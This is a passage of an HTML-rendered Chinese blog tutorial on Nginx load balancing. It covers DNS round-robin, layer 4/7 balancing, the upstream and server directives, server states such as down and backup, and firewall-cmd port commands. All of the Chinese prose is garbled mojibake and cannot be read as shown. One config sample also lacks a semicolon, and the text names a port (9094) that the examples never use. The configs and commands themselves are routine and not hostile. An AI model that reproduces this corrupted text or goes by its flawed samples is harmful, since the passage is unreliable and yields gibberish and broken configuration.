æ–¹å¼ä¸€:ç”¨æˆ·æ‰‹åŠ¨é€‰æ‹©</h4><p>è¿™ç§æ–¹å¼æ¯”è¾ƒåŸå§‹ï¼Œåªè¦å®ç°çš„æ–¹å¼å°±æ˜¯åœ¨ç½‘ç«™ä¸»é¡µä¸Šé¢æä¾›ä¸åŒçº¿è·¯ã€ä¸åŒæœåŠ¡å™¨é“¾æ¥æ–¹å¼ï¼Œè®©ç”¨æˆ·æ¥é€‰æ‹©è‡ªå·±è®¿é—®çš„å…·ä½“æœåŠ¡å™¨ï¼Œæ¥å®ç°è´Ÿè½½å‡è¡¡ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1584602887881.png" alt="1584602887881" /></p><h4 id="æ–¹å¼äºŒdnsè½®è¯¢æ–¹å¼"><a class="markdownIt-Anchor" href="#æ–¹å¼äºŒdnsè½®è¯¢æ–¹å¼"></a> æ–¹å¼äºŒ:DNSè½®è¯¢æ–¹å¼</h4><p>DNS</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">åŸŸåç³»ç»Ÿï¼ˆæœåŠ¡ï¼‰åè®®ï¼ˆDNSï¼‰æ˜¯ä¸€ç§åˆ†å¸ƒå¼ç½‘ç»œç›®å½•æœåŠ¡ï¼Œä¸»è¦ç”¨äºåŸŸåä¸ <span class="hljs-built_in">IP</span> åœ°å€çš„ç›¸äº’è½¬æ¢ã€‚<br></code></pre></td></tr></table></figure><p>å¤§å¤šåŸŸåæ³¨å†Œå•†éƒ½æ”¯æŒå¯¹åŒä¸€ä¸ªä¸»æœºåæ·»åŠ å¤šæ¡Aè®°å½•ï¼Œè¿™å°±æ˜¯DNSè½®è¯¢ï¼ŒDNSæœåŠ¡å™¨å°†è§£æè¯·æ±‚æŒ‰ç…§Aè®°å½•çš„é¡ºåºï¼Œéšæœºåˆ†é…åˆ°ä¸åŒçš„IPä¸Šï¼Œè¿™æ ·å°±èƒ½å®Œæˆç®€å•çš„è´Ÿè½½å‡è¡¡ã€‚DNSè½®è¯¢çš„æˆæœ¬éå¸¸ä½ï¼Œåœ¨ä¸€äº›ä¸é‡è¦çš„æœåŠ¡å™¨ï¼Œè¢«ç»å¸¸ä½¿ç”¨ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1591010973996.png" alt="1591010973996" /></p><p>å¦‚ä¸‹æ˜¯æˆ‘ä»¬ä¸ºæŸä¸€ä¸ªåŸŸåæ·»åŠ çš„IPåœ°å€ï¼Œç”¨2å°æœåŠ¡å™¨æ¥åšè´Ÿè½½å‡è¡¡ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1590064506355.png" alt="1590064506355" /></p><p>éªŒè¯:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">ping</span> www.nginx521.cn<br></code></pre></td></tr></table></figure><p>æ¸…ç©ºæœ¬åœ°çš„dnsç¼“å­˜</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ipconfig/flushdns<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘ç°ä½¿ç”¨DNSæ¥å®ç°è½®è¯¢ï¼Œä¸éœ€è¦æŠ•å…¥è¿‡å¤šçš„æˆæœ¬ï¼Œè™½ç„¶DNSè½®è¯¢æˆæœ¬ä½å»‰ï¼Œä½†æ˜¯DNSè´Ÿè½½å‡è¡¡å­˜åœ¨æ˜æ˜¾çš„ç¼ºç‚¹ã€‚</p><p>1.å¯é æ€§ä½</p><p>å‡è®¾ä¸€ä¸ªåŸŸåDNSè½®è¯¢å¤šå°æœåŠ¡å™¨ï¼Œå¦‚æœå…¶ä¸­çš„ä¸€å°æœåŠ¡å™¨å‘ç”Ÿæ•…éšœï¼Œé‚£ä¹ˆæ‰€æœ‰çš„è®¿é—®è¯¥æœåŠ¡å™¨çš„è¯·æ±‚å°†ä¸ä¼šæœ‰æ‰€å›åº”ï¼Œå³ä½¿ä½ å°†è¯¥æœåŠ¡å™¨çš„IPä»DNSä¸­å»æ‰ï¼Œä½†æ˜¯ç”±äºå„å¤§å®½å¸¦æ¥å…¥å•†å°†ä¼—å¤šçš„DNSå­˜æ”¾åœ¨ç¼“å­˜ä¸­ï¼Œä»¥èŠ‚çœè®¿é—®æ—¶é—´ï¼Œå¯¼è‡´DNSä¸ä¼šå®æ—¶æ›´æ–°ã€‚æ‰€ä»¥DNSè½®æµä¸Šä¸€å®šç¨‹åº¦ä¸Šè§£å†³äº†è´Ÿè½½å‡è¡¡é—®é¢˜ï¼Œä½†æ˜¯å´å­˜åœ¨å¯é æ€§ä¸é«˜çš„ç¼ºç‚¹ã€‚</p><p>2.è´Ÿè½½å‡è¡¡ä¸å‡è¡¡</p><p>DNSè´Ÿè½½å‡è¡¡é‡‡ç”¨çš„æ˜¯ç®€å•çš„è½®è¯¢è´Ÿè½½ç®—æ³•ï¼Œä¸èƒ½åŒºåˆ†æœåŠ¡å™¨çš„å·®å¼‚ï¼Œä¸èƒ½åæ˜ æœåŠ¡å™¨çš„å½“å‰è¿è¡ŒçŠ¶æ€ï¼Œä¸èƒ½åšåˆ°ä¸ºæ€§èƒ½å¥½çš„æœåŠ¡å™¨å¤šåˆ†é…è¯·æ±‚ï¼Œå¦å¤–æœ¬åœ°è®¡ç®—æœºä¹Ÿä¼šç¼“å­˜å·²ç»è§£æçš„åŸŸååˆ°IPåœ°å€çš„æ˜ å°„ï¼Œè¿™ä¹Ÿä¼šå¯¼è‡´ä½¿ç”¨è¯¥DNSæœåŠ¡å™¨çš„ç”¨æˆ·åœ¨ä¸€å®šæ—¶é—´å†…è®¿é—®çš„æ˜¯åŒä¸€å°WebæœåŠ¡å™¨ï¼Œä»è€Œå¼•å‘WebæœåŠ¡å™¨å‡çš„è´Ÿè½½ä¸å‡è¡¡ã€‚</p><p>è´Ÿè½½ä¸å‡è¡¡åˆ™ä¼šå¯¼è‡´æŸå‡ å°æœåŠ¡å™¨è´Ÿè·å¾ˆä½ï¼Œè€Œå¦å¤–å‡ å°æœåŠ¡å™¨è´Ÿè·ç¡®å¾ˆé«˜ï¼Œå¤„ç†è¯·æ±‚çš„é€Ÿåº¦æ…¢ï¼Œé…ç½®é«˜çš„æœåŠ¡å™¨åˆ†é…åˆ°çš„è¯·æ±‚å°‘ï¼Œè€Œé…ç½®ä½çš„æœåŠ¡å™¨åˆ†é…åˆ°çš„è¯·æ±‚å¤šã€‚</p><h4 id="æ–¹å¼ä¸‰å››ä¸ƒå±‚è´Ÿè½½å‡è¡¡"><a class="markdownIt-Anchor" href="#æ–¹å¼ä¸‰å››ä¸ƒå±‚è´Ÿè½½å‡è¡¡"></a> æ–¹å¼ä¸‰:å››/ä¸ƒå±‚è´Ÿè½½å‡è¡¡</h4><p>ä»‹ç»å››/ä¸ƒå±‚è´Ÿè½½å‡è¡¡ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸ªæ¦‚å¿µï¼ŒOSI(open system interconnection),å«å¼€æ”¾å¼ç³»ç»Ÿäº’è”æ¨¡å‹ï¼Œè¿™ä¸ªæ˜¯ç”±å›½é™…æ ‡å‡†åŒ–ç»„ç»‡ISOæŒ‡å®šçš„ä¸€ä¸ªä¸åŸºäºå…·ä½“æœºå‹ã€æ“ä½œç³»ç»Ÿæˆ–å…¬å¸çš„ç½‘ç»œä½“ç³»ç»“æ„ã€‚è¯¥æ¨¡å‹å°†ç½‘ç»œé€šä¿¡çš„å·¥ä½œåˆ†ä¸ºä¸ƒå±‚ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1584693830966.png" alt="1584693830966" /></p><p>åº”ç”¨å±‚ï¼šä¸ºåº”ç”¨ç¨‹åºæä¾›ç½‘ç»œæœåŠ¡ã€‚</p><p>è¡¨ç¤ºå±‚ï¼šå¯¹æ•°æ®è¿›è¡Œæ ¼å¼åŒ–ã€ç¼–ç ã€åŠ å¯†ã€å‹ç¼©ç­‰æ“ä½œã€‚</p><p>ä¼šè¯å±‚ï¼šå»ºç«‹ã€ç»´æŠ¤ã€ç®¡ç†ä¼šè¯è¿æ¥ã€‚</p><p>ä¼ è¾“å±‚ï¼šå»ºç«‹ã€ç»´æŠ¤ã€ç®¡ç†ç«¯åˆ°ç«¯çš„è¿æ¥ï¼Œå¸¸è§çš„æœ‰TCP/UDPã€‚</p><p>ç½‘ç»œå±‚ï¼šIPå¯»å€å’Œè·¯ç”±é€‰æ‹©</p><p>æ•°æ®é“¾è·¯å±‚ï¼šæ§åˆ¶ç½‘ç»œå±‚ä¸ç‰©ç†å±‚ä¹‹é—´çš„é€šä¿¡ã€‚</p><p>ç‰©ç†å±‚ï¼šæ¯”ç‰¹æµä¼ è¾“ã€‚</p><p>æ‰€è°“å››å±‚è´Ÿè½½å‡è¡¡æŒ‡çš„æ˜¯OSIä¸ƒå±‚æ¨¡å‹ä¸­çš„ä¼ è¾“å±‚ï¼Œä¸»è¦æ˜¯åŸºäºIP+PORTçš„è´Ÿè½½å‡è¡¡</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm">å®ç°å››å±‚è´Ÿè½½å‡è¡¡çš„æ–¹å¼ï¼š<br>ç¡¬ä»¶ï¼š<span class="hljs-built_in">F5</span> BIG-<span class="hljs-built_in">IP</span>ã€Radwareç­‰<br>è½¯ä»¶ï¼šLVSã€Nginxã€Hayproxyç­‰<br></code></pre></td></tr></table></figure><p>æ‰€è°“çš„ä¸ƒå±‚è´Ÿè½½å‡è¡¡æŒ‡çš„æ˜¯åœ¨åº”ç”¨å±‚ï¼Œä¸»è¦æ˜¯åŸºäºè™šæ‹Ÿçš„URLæˆ–ä¸»æœºIPçš„è´Ÿè½½å‡è¡¡</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">å®ç°ä¸ƒå±‚è´Ÿè½½å‡è¡¡çš„æ–¹å¼ï¼š<br>è½¯ä»¶ï¼šNginxã€Hayproxyç­‰<br></code></pre></td></tr></table></figure><p>å››å±‚å’Œä¸ƒå±‚è´Ÿè½½å‡è¡¡çš„åŒºåˆ«</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">å››å±‚è´Ÿè½½å‡è¡¡æ•°æ®åŒ…æ˜¯åœ¨åº•å±‚å°±è¿›è¡Œäº†åˆ†å‘ï¼Œè€Œä¸ƒå±‚è´Ÿè½½å‡è¡¡æ•°æ®åŒ…åˆ™åœ¨æœ€é¡¶ç«¯è¿›è¡Œåˆ†å‘ï¼Œæ‰€ä»¥å››å±‚è´Ÿè½½å‡è¡¡çš„æ•ˆç‡æ¯”ä¸ƒå±‚è´Ÿè½½å‡è¡¡çš„è¦é«˜ã€‚<br>å››å±‚è´Ÿè½½å‡è¡¡ä¸è¯†åˆ«åŸŸåï¼Œè€Œä¸ƒå±‚è´Ÿè½½å‡è¡¡è¯†åˆ«åŸŸåã€‚<br></code></pre></td></tr></table></figure><p>å¤„ç†å››å±‚å’Œä¸ƒå±‚è´Ÿè½½ä»¥ä¸ºå…¶å®è¿˜æœ‰äºŒå±‚ã€ä¸‰å±‚è´Ÿè½½å‡è¡¡ï¼ŒäºŒå±‚æ˜¯åœ¨æ•°æ®é“¾è·¯å±‚åŸºäºmacåœ°å€æ¥å®ç°è´Ÿè½½å‡è¡¡ï¼Œä¸‰å±‚æ˜¯åœ¨ç½‘ç»œå±‚ä¸€èˆ¬é‡‡ç”¨è™šæ‹ŸIPåœ°å€çš„æ–¹å¼å®ç°è´Ÿè½½å‡è¡¡ã€‚</p><p>å®é™…ç¯å¢ƒé‡‡ç”¨çš„æ¨¡å¼</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">å››å±‚è´Ÿè½½<span class="hljs-comment">(LVS)</span>+ä¸ƒå±‚è´Ÿè½½<span class="hljs-comment">(Nginx)</span><br></code></pre></td></tr></table></figure><h3 id="nginxä¸ƒå±‚è´Ÿè½½å‡è¡¡"><a class="markdownIt-Anchor" href="#nginxä¸ƒå±‚è´Ÿè½½å‡è¡¡"></a> Nginxä¸ƒå±‚è´Ÿè½½å‡è¡¡</h3><p>Nginxè¦å®ç°ä¸ƒå±‚è´Ÿè½½å‡è¡¡éœ€è¦ç”¨åˆ°proxy_passä»£ç†æ¨¡å—é…ç½®ã€‚Nginxé»˜è®¤å®‰è£…æ”¯æŒè¿™ä¸ªæ¨¡å—ï¼Œæˆ‘ä»¬ä¸éœ€è¦å†åšä»»ä½•å¤„ç†ã€‚Nginxçš„è´Ÿè½½å‡è¡¡æ˜¯åœ¨Nginxçš„åå‘ä»£ç†åŸºç¡€ä¸ŠæŠŠç”¨æˆ·çš„è¯·æ±‚æ ¹æ®æŒ‡å®šçš„ç®—æ³•åˆ†å‘åˆ°ä¸€ç»„ã€upstreamè™šæ‹ŸæœåŠ¡æ± ã€‘ã€‚</p><h4 id="nginxä¸ƒå±‚è´Ÿè½½å‡è¡¡çš„æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#nginxä¸ƒå±‚è´Ÿè½½å‡è¡¡çš„æŒ‡ä»¤"></a> Nginxä¸ƒå±‚è´Ÿè½½å‡è¡¡çš„æŒ‡ä»¤</h4><h5 id="upstreamæŒ‡ä»¤"><a class="markdownIt-Anchor" href="#upstreamæŒ‡ä»¤"></a> upstreamæŒ‡ä»¤</h5><p>è¯¥æŒ‡ä»¤æ˜¯ç”¨æ¥å®šä¹‰ä¸€ç»„æœåŠ¡å™¨ï¼Œå®ƒä»¬å¯ä»¥æ˜¯ç›‘å¬ä¸åŒç«¯å£çš„æœåŠ¡å™¨ï¼Œå¹¶ä¸”ä¹Ÿå¯ä»¥æ˜¯åŒæ—¶ç›‘å¬TCPå’ŒUnix socketçš„æœåŠ¡å™¨ã€‚æœåŠ¡å™¨å¯ä»¥æŒ‡å®šä¸åŒçš„æƒé‡ï¼Œé»˜è®¤ä¸º1ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>upstream name {â€¦}</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>http</td></tr></tbody></table><h5 id="serveræŒ‡ä»¤"><a class="markdownIt-Anchor" href="#serveræŒ‡ä»¤"></a> serveræŒ‡ä»¤</h5><p>è¯¥æŒ‡ä»¤ç”¨æ¥æŒ‡å®šåç«¯æœåŠ¡å™¨çš„åç§°å’Œä¸€äº›å‚æ•°ï¼Œå¯ä»¥ä½¿ç”¨åŸŸåã€IPã€ç«¯å£æˆ–è€…unix socket</p><table><thead><tr><th>è¯­æ³•</th><th>server name [paramerters]</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>upstream</td></tr></tbody></table><h4 id="nginxä¸ƒå±‚è´Ÿè½½å‡è¡¡çš„å®ç°æµç¨‹"><a class="markdownIt-Anchor" href="#nginxä¸ƒå±‚è´Ÿè½½å‡è¡¡çš„å®ç°æµç¨‹"></a> Nginxä¸ƒå±‚è´Ÿè½½å‡è¡¡çš„å®ç°æµç¨‹</h4><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1590248160635.png" alt="1590248160635" /></p><p>æœåŠ¡ç«¯è®¾ç½®</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>   <span class="hljs-number">9001</span>;<br>    <span class="hljs-attribute">server_name</span> linux.nginx;<br>    <span class="hljs-attribute">default_type</span> text/html;<br>    <span class="hljs-section">location</span> /&#123;<br>    <span class="hljs-attribute">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;&lt;h1&gt;linux.nginx:9001&lt;/h1&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>   <span class="hljs-number">9002</span>;<br>    <span class="hljs-attribute">server_name</span> linux.nginx;<br>    <span class="hljs-attribute">default_type</span> text/html;<br>    <span class="hljs-section">location</span> /&#123;<br>    <span class="hljs-attribute">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;&lt;h1&gt;linux.nginx:9002&lt;/h1&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>   <span class="hljs-number">9003</span>;<br>    <span class="hljs-attribute">server_name</span> linux.nginx;<br>    <span class="hljs-attribute">default_type</span> text/html;<br>    <span class="hljs-section">location</span> /&#123;<br>    <span class="hljs-attribute">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;&lt;h1&gt;linux.nginx:9003&lt;/h1&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è´Ÿè½½å‡è¡¡å™¨è®¾ç½®</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> backend&#123;<br>    <span class="hljs-attribute">server</span> linux.nginx:<span class="hljs-number">9001</span>;<br>    <span class="hljs-attribute">server</span> linux.nginx:<span class="hljs-number">9002</span>;<br>    <span class="hljs-attribute">server</span> linux.nginx:<span class="hljs-number">9003</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br>    <span class="hljs-attribute">server_name</span> linux.nginx;<br>    <span class="hljs-section">location</span> /&#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://backend;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="è´Ÿè½½å‡è¡¡çŠ¶æ€"><a class="markdownIt-Anchor" href="#è´Ÿè½½å‡è¡¡çŠ¶æ€"></a> è´Ÿè½½å‡è¡¡çŠ¶æ€</h4><p>ä»£ç†æœåŠ¡å™¨åœ¨è´Ÿè´£å‡è¡¡è°ƒåº¦ä¸­çš„çŠ¶æ€æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š</p><table><thead><tr><th>çŠ¶æ€</th><th>æ¦‚è¿°</th></tr></thead><tbody><tr><td>down</td><td>å½“å‰çš„serveræš‚æ—¶ä¸å‚ä¸è´Ÿè½½å‡è¡¡</td></tr><tr><td>backup</td><td>é¢„ç•™çš„å¤‡ä»½æœåŠ¡å™¨</td></tr><tr><td>max_fails</td><td>å…è®¸è¯·æ±‚å¤±è´¥çš„æ¬¡æ•°</td></tr><tr><td>fail_timeout</td><td>ç»è¿‡max_failså¤±è´¥å, æœåŠ¡æš‚åœæ—¶é—´</td></tr><tr><td>max_conns</td><td>é™åˆ¶æœ€å¤§çš„æ¥æ”¶è¿æ¥æ•°</td></tr></tbody></table><h5 id="down"><a class="markdownIt-Anchor" href="#down"></a> down</h5><p>down:å°†è¯¥æœåŠ¡å™¨æ ‡è®°ä¸ºæ°¸ä¹…ä¸å¯ç”¨ï¼Œé‚£ä¹ˆè¯¥ä»£ç†æœåŠ¡å™¨å°†ä¸å‚ä¸è´Ÿè½½å‡è¡¡ã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> backend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9001</span> down;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9002</span><br>server <span class="hljs-number">192.168.23.132:9003</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /&#123;<br><span class="hljs-attribute">proxy_pass</span> http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥çŠ¶æ€ä¸€èˆ¬ä¼šå¯¹éœ€è¦åœæœºç»´æŠ¤çš„æœåŠ¡å™¨è¿›è¡Œè®¾ç½®ã€‚</p><h5 id="backup"><a class="markdownIt-Anchor" href="#backup"></a> backup</h5><p>backup:å°†è¯¥æœåŠ¡å™¨æ ‡è®°ä¸ºå¤‡ä»½æœåŠ¡å™¨ï¼Œå½“ä¸»æœåŠ¡å™¨ä¸å¯ç”¨æ—¶ï¼Œå°†ç”¨æ¥ä¼ é€’è¯·æ±‚ã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> backend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9001</span> down;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9002</span> backup;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9003</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /&#123;<br><span class="hljs-attribute">proxy_pass</span> http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶éœ€è¦å°†9094ç«¯å£çš„è®¿é—®ç¦æ­¢æ‰æ¥æ¨¡æ‹Ÿä¸‹å”¯ä¸€èƒ½å¯¹å¤–æä¾›è®¿é—®çš„æœåŠ¡å®•æœºä»¥åï¼Œbackupçš„å¤‡ä»½æœåŠ¡å™¨å°±è¦å¼€å§‹å¯¹å¤–æä¾›æœåŠ¡ï¼Œæ­¤æ—¶ä¸ºäº†æµ‹è¯•éªŒè¯ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨é˜²ç«å¢™æ¥è¿›è¡Œæ‹¦æˆªã€‚</p><p>ä»‹ç»ä¸€ä¸ªå·¥å…·<code>firewall-cmd</code>,è¯¥å·¥å…·æ˜¯Linuxæä¾›çš„ä¸“é—¨ç”¨æ¥æ“ä½œfirewallçš„ã€‚</p><p>æŸ¥è¯¢é˜²ç«å¢™ä¸­æŒ‡å®šçš„ç«¯å£æ˜¯å¦å¼€æ”¾</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">firewall-<span class="hljs-keyword">cmd</span><span class="language-bash"> --query-port=9001/tcp</span><br></code></pre></td></tr></table></figure><p>å¦‚ä½•å¼€æ”¾ä¸€ä¸ªæŒ‡å®šçš„ç«¯å£</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">firewall</span><span class="hljs-literal">-</span><span class="hljs-comment">cmd</span> <span class="hljs-literal">--</span><span class="hljs-comment">permanent</span> <span class="hljs-literal">--</span><span class="hljs-comment">add</span><span class="hljs-literal">-</span><span class="hljs-comment">port=9002/tcp</span><br></code></pre></td></tr></table></figure><p>æ‰¹é‡æ·»åŠ å¼€å‘ç«¯å£</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">firewall</span>-cmd --permanent --add-port=<span class="hljs-number">9001</span>-<span class="hljs-number">9003</span>/tcp<br></code></pre></td></tr></table></figure><p>å¦‚ä½•ç§»é™¤ä¸€ä¸ªæŒ‡å®šçš„ç«¯å£</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">firewall</span><span class="hljs-literal">-</span><span class="hljs-comment">cmd</span> <span class="hljs-literal">--</span><span class="hljs-comment">permanent</span> <span class="hljs-literal">--</span><span class="hljs-comment">remove</span><span class="hljs-literal">-</span><span class="hljs-comment">port=9003/tcp</span><br></code></pre></td></tr></table></figure><p>é‡æ–°åŠ è½½</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">firewall-cmd <span class="hljs-comment">--reload</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­</p><p>â€‹ --permanentè¡¨ç¤ºè®¾ç½®ä¸ºæŒä¹…</p><p>â€‹ --add-portè¡¨ç¤ºæ·»åŠ æŒ‡å®šç«¯å£</p><p>â€‹ --remove-portè¡¨ç¤ºç§»é™¤æŒ‡å®šç«¯å£</p><h5 id="max_conns"><a class="markdownIt-Anchor" href="#max_conns"></a> max_conns</h5><p>max_conns=number:ç”¨æ¥è®¾ç½®ä»£ç†æœåŠ¡å™¨åŒæ—¶æ´»åŠ¨é“¾æ¥çš„æœ€å¤§æ•°é‡ï¼Œé»˜è®¤ä¸º0ï¼Œè¡¨ç¤ºä¸é™åˆ¶ï¼Œä½¿ç”¨è¯¥é…ç½®å¯ä»¥æ ¹æ®åç«¯æœåŠ¡å™¨å¤„ç†è¯·æ±‚çš„å¹¶å‘é‡æ¥è¿›è¡Œè®¾ç½®ï¼Œé˜²æ­¢åç«¯æœåŠ¡å™¨è¢«å‹å®ã€‚</p><h5 id="max_failså’Œfail_timeout"><a class="markdownIt-Anchor" href="#max_failså’Œfail_timeout"></a> max_failså’Œfail_timeout</h5><p>max_fails=number:è®¾ç½®å…è®¸è¯·æ±‚ä»£ç†æœåŠ¡å™¨å¤±è´¥çš„æ¬¡æ•°ï¼Œé»˜è®¤ä¸º1ã€‚</p><p>fail_timeout=time:è®¾ç½®ç»è¿‡max_failså¤±è´¥åï¼ŒæœåŠ¡æš‚åœçš„æ—¶é—´ï¼Œé»˜è®¤æ˜¯10ç§’ã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> backend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.200.133:9001</span> down;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.200.133:9002</span> backup;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.200.133:9003</span> max_fails=<span class="hljs-number">3</span> fail_timeout=<span class="hljs-number">15</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /&#123;<br><span class="hljs-attribute">proxy_pass</span> http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="è´Ÿè½½å‡è¡¡ç­–ç•¥"><a class="markdownIt-Anchor" href="#è´Ÿè½½å‡è¡¡ç­–ç•¥"></a> è´Ÿè½½å‡è¡¡ç­–ç•¥</h4><p>ä»‹ç»å®ŒNginxè´Ÿè½½å‡è¡¡çš„ç›¸å…³æŒ‡ä»¤åï¼Œæˆ‘ä»¬å·²ç»èƒ½å®ç°å°†ç”¨æˆ·çš„è¯·æ±‚åˆ†å‘åˆ°ä¸åŒçš„æœåŠ¡å™¨ä¸Šï¼Œé‚£ä¹ˆé™¤äº†é‡‡ç”¨é»˜è®¤çš„åˆ†é…æ–¹å¼ä»¥å¤–ï¼Œæˆ‘ä»¬è¿˜èƒ½é‡‡ç”¨ä»€ä¹ˆæ 